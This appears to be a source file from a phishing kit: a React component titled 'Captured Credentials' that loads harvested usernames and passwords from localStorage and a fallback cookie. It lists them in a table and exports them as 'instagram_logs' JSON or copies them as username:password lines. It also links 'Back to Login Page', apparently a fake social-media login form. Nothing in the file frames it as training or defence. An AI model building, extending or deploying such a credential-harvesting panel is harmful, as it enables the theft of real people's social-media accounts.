"use client";

import { useEffect, useState } from "react";

export default function CapturedLogs() {
  const [logs, setLogs] = useState<any[]>([]);
  const [deviceInfo, setDeviceInfo] = useState<string>("");

  useEffect(() => {
    // Load logs from localStorage
    try {
      const stored = JSON.parse(localStorage.getItem("phishLogs") || "[]");
      setLogs(stored);
      
      // Load fallback from cookies if needed
      const cookieFallback = document.cookie
        .split('; ')
        .find(row => row.startsWith('phishFallback='));
      
      if (cookieFallback && stored.length === 0) {
        const fallbackData = JSON.parse(cookieFallback.split('=')[1]);
        setLogs([fallbackData]);
      }
    } catch (error) {
      console.error("Error loading logs:", error);
    }

    // Get device info
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    setDeviceInfo(`${isMobile ? 'Mobile' : 'Desktop'} - ${navigator.userAgent.substring(0, 50)}...`);
  }, []);

  const clearLogs = () => {
    localStorage.removeItem("phishLogs");
    sessionStorage.removeItem("lastCapture");
    // Clear cookie fallback
    document.cookie = "phishFallback=; max-age=0";
    setLogs([]);
  };

  const exportLogs = () => {
    const dataStr = JSON.stringify(logs, null, 2);
    const dataBlob = new Blob([dataStr], { type: "application/json" });
    const url = URL.createObjectURL(dataBlob);
    const link = document.createElement("a");
    link.href = url;
    link.download = `instagram_logs_${new Date().toISOString().split('T')[0]}.json`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  };

  const copyToClipboard = () => {
    const text = logs.map(log => 
      `${log.timestamp} - ${log.username}:${log.password}`
    ).join('\n');
    
    navigator.clipboard.writeText(text).then(() => {
      alert("Logs copied to clipboard!");
    });
  };

  return (
    <div style={{
      minHeight: "100vh",
      background: "#000",
      color: "#fff",
      padding: "20px 16px 40px",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
      overflowX: "hidden"
    }}>
      <div style={{ maxWidth: "1200px", margin: "0 auto" }}>
        <h1 style={{ 
          color: "#fe2c55", 
          fontSize: "clamp(24px, 5vw, 32px)",
          marginBottom: "24px",
          textAlign: "center",
          fontWeight: "700"
        }}>
          📱 Captured Credentials
        </h1>

        {/* Stats */}
        <div style={{
          background: "#111",
          borderRadius: "12px",
          padding: "20px",
          marginBottom: "24px",
          border: "1px solid #222"
        }}>
          <div style={{ display: "flex", justifyContent: "space-between", flexWrap: "wrap", gap: "10px" }}>
            <div style={{ textAlign: "center", flex: "1" }}>
              <div style={{ fontSize: "28px", fontWeight: "700", color: "#fe2c55" }}>
                {logs.length}
              </div>
              <div style={{ fontSize: "14px", color: "#888" }}>Total Captures</div>
            </div>
            <div style={{ textAlign: "center", flex: "1" }}>
              <div style={{ fontSize: "20px", fontWeight: "500", color: "#fff" }}>
                {deviceInfo.split(" - ")[0]}
              </div>
              <div style={{ fontSize: "12px", color: "#888", wordBreak: "break-all" }}>
                {deviceInfo}
              </div>
            </div>
            <div style={{ textAlign: "center", flex: "1" }}>
              <div style={{ fontSize: "20px", fontWeight: "500", color: "#fff" }}>
                {logs.length > 0 ? new Date(logs[logs.length-1].timestamp).toLocaleTimeString() : "N/A"}
              </div>
              <div style={{ fontSize: "12px", color: "#888" }}>Last Capture</div>
            </div>
          </div>
        </div>

        {/* Table */}
        {logs.length === 0 ? (
          <div style={{ 
            textAlign: "center", 
            color: "#aaa", 
            padding: "60px 20px",
            background: "#111",
            borderRadius: "12px",
            border: "1px dashed #333"
          }}>
            <div style={{ fontSize: "48px", marginBottom: "20px" }}>📭</div>
            <div style={{ fontSize: "18px", marginBottom: "10px" }}>No captures yet</div>
            <div style={{ fontSize: "14px", color: "#666" }}>Try submitting the login form</div>
          </div>
        ) : (
          <div style={{ overflowX: "auto", borderRadius: "12px", border: "1px solid #222" }}>
            <table style={{
              width: "100%",
              borderCollapse: "collapse",
              background: "#111",
              minWidth: "600px"
            }}>
              <thead>
                <tr style={{ background: "#222" }}>
                  <th style={{ padding: "16px", borderBottom: "1px solid #333", textAlign: "left", fontSize: "14px", fontWeight: "600" }}>ID</th>
                  <th style={{ padding: "16px", borderBottom: "1px solid #333", textAlign: "left", fontSize: "14px", fontWeight: "600" }}>Time</th>
                  <th style={{ padding: "16px", borderBottom: "1px solid #333", textAlign: "left", fontSize: "14px", fontWeight: "600" }}>Username/Email</th>
                  <th style={{ padding: "16px", borderBottom: "1px solid #333", textAlign: "left", fontSize: "14px", fontWeight: "600" }}>Password</th>
                </tr>
              </thead>
              <tbody>
                {logs.map((log, index) => (
                  <tr key={log.id} style={{ 
                    borderBottom: "1px solid #222",
                    background: index % 2 === 0 ? "#111" : "#0a0a0a"
                  }}>
                    <td style={{ padding: "16px", fontSize: "13px", color: "#888" }}>{log.id}</td>
                    <td style={{ padding: "16px", fontSize: "14px" }}>{log.timestamp}</td>
                    <td style={{ padding: "16px", fontFamily: "'Courier New', monospace", fontSize: "14px", color: "#4CAF50" }}>
                      {log.username}
                    </td>
                    <td style={{ padding: "16px", fontFamily: "'Courier New', monospace", fontSize: "14px", color: "#FF9800" }}>
                      {log.password}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* Action Buttons */}
        {logs.length > 0 && (
          <div style={{
            display: "flex",
            flexWrap: "wrap",
            gap: "12px",
            marginTop: "24px",
            justifyContent: "center"
          }}>
            <button
              onClick={clearLogs}
              style={{
                padding: "14px 28px",
                background: "#fe2c55",
                color: "white",
                border: "none",
                borderRadius: "8px",
                cursor: "pointer",
                fontSize: "16px",
                fontWeight: "600",
                flex: "1",
                minWidth: "160px",
                transition: "all 0.2s ease"
              }}
              onTouchStart={(e) => e.currentTarget.style.opacity = "0.8"}
              onTouchEnd={(e) => e.currentTarget.style.opacity = "1"}
            >
              🗑️ Clear All Logs
            </button>

            <button
              onClick={exportLogs}
              style={{
                padding: "14px 28px",
                background: "#2196F3",
                color: "white",
                border: "none",
                borderRadius: "8px",
                cursor: "pointer",
                fontSize: "16px",
                fontWeight: "600",
                flex: "1",
                minWidth: "160px",
                transition: "all 0.2s ease"
              }}
              onTouchStart={(e) => e.currentTarget.style.opacity = "0.8"}
              onTouchEnd={(e) => e.currentTarget.style.opacity = "1"}
            >
              💾 Export JSON
            </button>

            <button
              onClick={copyToClipboard}
              style={{
                padding: "14px 28px",
                background: "#4CAF50",
                color: "white",
                border: "none",
                borderRadius: "8px",
                cursor: "pointer",
                fontSize: "16px",
                fontWeight: "600",
                flex: "1",
                minWidth: "160px",
                transition: "all 0.2s ease"
              }}
              onTouchStart={(e) => e.currentTarget.style.opacity = "0.8"}
              onTouchEnd={(e) => e.currentTarget.style.opacity = "1"}
            >
              📋 Copy to Clipboard
            </button>
          </div>
        )}

        {/* Navigation */}
        <div style={{
          marginTop: "40px",
          textAlign: "center",
          paddingTop: "20px",
          borderTop: "1px solid #333"
        }}>
          <a 
            href="/" 
            style={{ 
              color: "#fe2c55", 
              textDecoration: "none",
              fontSize: "16px",
              fontWeight: "600",
              display: "inline-flex",
              alignItems: "center",
              gap: "8px",
              padding: "12px 24px",
              background: "#111",
              borderRadius: "8px",
              border: "1px solid #333",
              transition: "all 0.2s ease"
            }}
            onTouchStart={(e) => e.currentTarget.style.opacity = "0.8"}
            onTouchEnd={(e) => e.currentTarget.style.opacity = "1"}
          >
            ← Back to Login Page
          </a>
          
          <div style={{
            marginTop: "20px",
            color: "#888",
            fontSize: "12px"
          }}>
            Total storage used: {JSON.stringify(localStorage.getItem("phishLogs") || "").length} bytes
          </div>
        </div>
      </div>
    </div>
  );
}